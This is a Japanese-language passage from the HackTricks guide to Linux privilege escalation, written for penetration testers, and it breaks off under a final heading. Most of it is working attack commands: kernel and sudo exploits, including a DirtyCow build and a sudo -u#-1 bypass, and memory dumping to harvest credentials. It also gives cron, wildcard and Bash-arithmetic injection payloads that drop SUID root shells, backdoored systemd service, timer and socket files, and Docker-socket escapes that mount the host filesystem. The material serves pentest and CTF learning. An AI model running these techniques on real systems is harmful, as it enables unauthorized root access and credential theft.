# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中のOSについての情報を収集しましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH` 変数内のいずれかのフォルダに書き込み権限がある** 場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privilegesに使用できるexploitがあるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良質な脆弱なカーネルのリストや、既に **compiled exploits** があるものは次で見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他、いくつかの **compiled exploits** が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは次のとおりです:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploits のみチェック)

Always **search the kernel version in Google**, maybe your kernel version is written in some kernel exploit and then you will be sure that this exploit is valid.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

次に示す脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使用して、sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: 署名の検証に失敗しました

**smasher2 box of HTB**を確認して、このvulnがどのように悪用され得るかの**例**を参照してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### より詳細なシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいるなら、そこから脱出を試みることができます：

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**どのディレクトリがマウントされていて、どれがアンマウントされているか**、どこに、なぜを確認してください。もし何かがアンマウントされているなら、それをマウントして機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploitを使用する必要がある場合に役立ちます。kernel exploitは、使用するマシン（または同様のマシン）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストール済みパッケージとサービスのバージョン**を確認してください。例えば、古い Nagios バージョンが存在し、escalating privileges のために悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないため、インストールされているソフトウェアのバージョンが既知のexploitsに対して脆弱かどうかをチェックするOpenVASのようなアプリケーションの使用を推奨します_

## プロセス

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来持つべき以上の権限**を持っていないかをチェックしてください（例えば tomcat が root によって実行されているなど？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### プロセス監視

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### プロセスのメモリ

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であれば全てのプロセスをデバッグできます。これは従来の ptracing の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: デバッグできるのは親プロセスのみです。
> - **kernel.yama.ptrace_scope = 2**: ptrace を使用できるのは管理者のみで、CAP_SYS_PTRACE capability が必要です。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptracing を再度有効にするには再起動が必要です。

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

あるプロセスIDについて、**maps はそのプロセス内でメモリがどのようにマッピングされているかを示します** 仮想アドレス空間; また、**各マッピング領域のアクセス権** を表示します。**mem** 疑似ファイルは**プロセスのメモリ自体を露出します**。**maps** ファイルからどの **メモリ領域が読み取り可能か** とそのオフセットがわかります。この情報を使って**mem ファイル内をシークし、読み取り可能な領域をすべてファイルにダンプします**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリにアクセスするためのもので、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、SysinternalsのツールスイートにあるクラシックなProcDumpツールをlinux向けに再構想したものです。入手はこちら: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_rootの要件を手動で削除して、自分が所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの認証情報

#### 手動の例

もしauthenticatorプロセスが実行されていることを見つけたら:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdump（プロセスのメモリをdumpするさまざまな方法は前のセクションを参照）して、メモリ内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を窃取**し、いくつかの**よく知られたファイル**からも取得します。正しく動作させるには root 権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali Desktop, Debian Desktop)     | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (アクティブな FTP 接続)                    | vsftpd               |
| Apache2 (アクティブな HTTP Basic 認証セッション)  | apache2              |
| OpenSSH (アクティブな SSH セッション - sudo 使用時) | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron jobs

### Crontab UI (alseambusher) が root として実行されている — web-based scheduler privesc

もし web “Crontab UI” パネル (alseambusher/crontab-ui) が root として実行され、loopback にのみバインドされている場合でも、SSH のローカルポートフォワーディングでアクセスして特権ジョブを作成し権限昇格できます。

典型的なチェーン
- loopback-only port（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で発見
- 運用アーティファクトから credentials を見つける:
  - バックアップ/スクリプト内の `zip -P <password>`
  - systemd ユニットで `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を公開している
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- high-priv job を作成して即実行する（SUID shell を落とす）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root で実行しない。専用ユーザーと最小権限で制限すること
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを再利用しないこと
- unit files に secrets を埋め込まない。secret stores または root-only EnvironmentFile を使用すること
- オンデマンドジョブ実行の監査/ログを有効にすること

スケジュールされたジョブに脆弱性がないか確認すること。root によって実行されるスクリプトを利用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使う? root が使うディレクトリに特定のファイルを作成する?）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中には次のような PATH が設定されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー "user" が /home/user に書き込み権限を持っていることに注意）

この crontab 内で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
そうすると、root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

rootによって実行されるスクリプトのコマンド内に “**\***” が含まれている場合、それを悪用して予期しないこと（privescなど）を引き起こせる可能性があります。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードがパスの前にある場合（例：** _**/some/path/\***_ **）、脆弱ではありません（_**./\***_ **も同様です）。**

以下のページも参照して、ワイルドカードの悪用トリックを確認してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### cron ログパーサにおける Bash arithmetic expansion injection

Bash は parameter expansion と command substitution を ((...)), $((...)) および let の算術評価前に行います。もし root cron/parser が信頼できないログフィールドを読み取り、それを算術コンテキストに渡すと、攻撃者は command substitution $(...) を注入でき、cron 実行時に root として実行されます。

- なぜ動作するか: Bash では展開が次の順序で発生します: parameter/variable expansion、command substitution、arithmetic expansion、その後に word splitting と pathname expansion。したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく続行されます。

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用手順: 攻撃者が制御するテキストを解析対象のログに書き込ませ、数値に見えるフィールドが command substitution を含みかつ末尾が数字になるようにします。コマンドが stdout に出力しない（またはリダイレクトする）ようにして、算術が有効なままにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron スクリプトの上書きと symlink

もし root によって実行される **cron スクリプトを変更できる** なら、非常に簡単にシェルを取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が **directory where you have full access** を使用している場合、その folder を削除して、あなたが制御する script を配置した別の場所に **create a symlink folder to another one** することが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。 それを利用して、escalate privileges できるかもしれません。

例えば、**1分間0.1秒ごとに監視し**、**実行回数の少ないコマンドでソートし**、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のツールも使えます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します)。

### 見えない cron ジョブ

コメントの後に**キャリッジリターンを入れる（newline 文字ではなく）**ことで cronjob を作成でき、cron ジョブは動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能なら、**それを変更して** サービスが**開始**、**再起動**、または**停止**したときにあなたの**backdoorを実行する**ようにすることができます（マシンの再起動を待つ必要があるかもしれません）。\
例えば、.service ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`** のように設定します

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに対する**書き込み権限がある**場合、それらを backdoor に置き換えることができ、サービスが再実行されたときに backdoor が実行されるようになります。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**書き込み**ができることが分かれば、**escalate privileges**できる可能性があります。以下のような、サービス設定ファイルで**相対パスが使用されている**かを探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと**同じ名前**の**executable**を作成してください。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの**backdoor**が実行されます（非特権ユーザーは通常サービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。

**サービスの詳細は `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントの組み込みサポートがあり、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

もしタイマーを変更できるなら、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントには Unit が何であるか次のように説明されています：

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

したがって、この権限を悪用するには、次のことが必要です:

- systemd unit（例: `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
- 相対パスを実行している systemd unit を見つけ、かつその実行ファイルを偽装するために **書き込み権限** を **systemd PATH** に対して持っていること（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意: **timer** は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで**有効化**されます。

## ソケット

Unix Domain Sockets (UDS) は、クライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらはコンピュータ間通信のために標準の Unix ディスクリプタファイルを利用し、`.socket` ファイルを通じて設定されます。

Sockets は `.socket` ファイルを使って設定できます。

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要点としてはソケットがどこでリッスンするか（AF_UNIX ソケットファイルのパス、リッスンする IPv4/6 および/またはポート番号など）を**示す**ために使われます。
- `Accept`: 真偽値を取ります。**true** の場合、**各着信接続ごとにサービスインスタンスが生成され**、その接続ソケットのみが渡されます。**false** の場合、すべてのリッスンソケット自体が**起動されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットのみが生成されます。この値は、単一のサービスユニットが無条件にすべての着信トラフィックを処理する datagram ソケットおよび FIFO では無視されます。**デフォルトは false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする**ソケット**/FIFO がそれぞれ**作成され**バインドされる**前**または**後**に実行されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFO がそれぞれ**閉じられ**削除される**前**または**後**に実行される追加の**コマンド**です。
- `Service`: **着信トラフィック**時に**アクティブ化する** **service** ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトではソケットと同じ名前のサービス（サフィックスを置き換えたもの）になります。ほとんどの場合、このオプションを使用する必要はありません。

### Writable .socket files

もし**書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**すると、ソケットが作成される前に backdoor が実行されます。したがって、**おそらくマシンを再起動するまで待つ必要があります。**\
_システムがその socket ファイル構成を使用していなければ、backdoor は実行されません_

### Writable sockets

もし**書き込み可能なソケット**を**発見**した場合（ここでは設定の `.socket` ファイルではなく Unix ソケット自体の話です）、そのソケットと**通信する**ことができ、場合によっては脆弱性を突くことも可能です。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

いくつかの **sockets listening for HTTP** requests が存在する場合があることに注意してください。(_.socket files のことではなく、unix sockets として動作するファイルのことを指しています_)。次のコマンドで確認できます：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **responds with an HTTP** request, then you can **communicate** with it and maybe **exploit some vulnerability**.

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. デフォルトでは `root` ユーザーと `docker` グループのメンバーが書き込み可能です。This socket への write access を持つことは privilege escalation に繋がる可能性があります。以下では、これがどのように行われるかと、Docker CLI が利用できない場合の代替手段について説明します。

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root-level アクセスを持つ container を実行することを可能にします。

#### **Docker API を直接使用する**

Docker CLI が利用できない場合でも、Docker ソケットは Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントする container を作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成した container を起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使って container に接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、ホストのファイルシステムに対する root-level アクセスで container 内で直接コマンドを実行できます。

### その他

docker ソケットに対して書き込み権限があり、**グループ `docker` のメンバーである** 場合は [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) であれば、それを侵害できる可能性もあります。

docker からのブレイクアウトや特権昇格に悪用するための他の方法については、以下を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できる場合は、次のページを参照してください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できる場合は、次のページを参照してください（**you may be able to abuse it to escalate privileges**）:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **inter-Process Communication (IPC) system** で、アプリケーションが効率的に相互作用しデータを共有することを可能にします。モダンな Linux システムを想定して設計されており、様々な形式のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的な IPC をサポートし、**enhanced UNIX domain sockets** を彷彿とさせます。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、着信通話に関する Bluetooth デーモンからのシグナルが音楽プレーヤーをミュートするよう促すことで、ユーザー体験が向上します。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑であった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールの一致の累積効果に基づいてメッセージの権限（メソッド呼び出し、シグナルの送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限を悪用することで privilege escalation を引き起こす可能性があります。

そのようなポリシーの例が `/etc/dbus-1/system.d/wpa_supplicant.conf` に示されており、root ユーザーが `fi.w1.wpa_supplicant1` の所有、送信、および受信の権限を持つことが詳述されています。

ユーザーやグループが指定されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされないものすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信 を enumerate および exploit する方法を学ぶ：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を把握するのは常に興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

アクセスする前に、事前にやり取りできなかったそのマシン上で実行されている network services を必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic ができるか確認してください。できる場合、いくつかの credentials を取得できる可能性があります。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**で、どの**権限**を持っているか、システムにどの**ユーザー**が存在するか、どのユーザーが**ログイン**できるか、どのユーザーが**root 権限**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

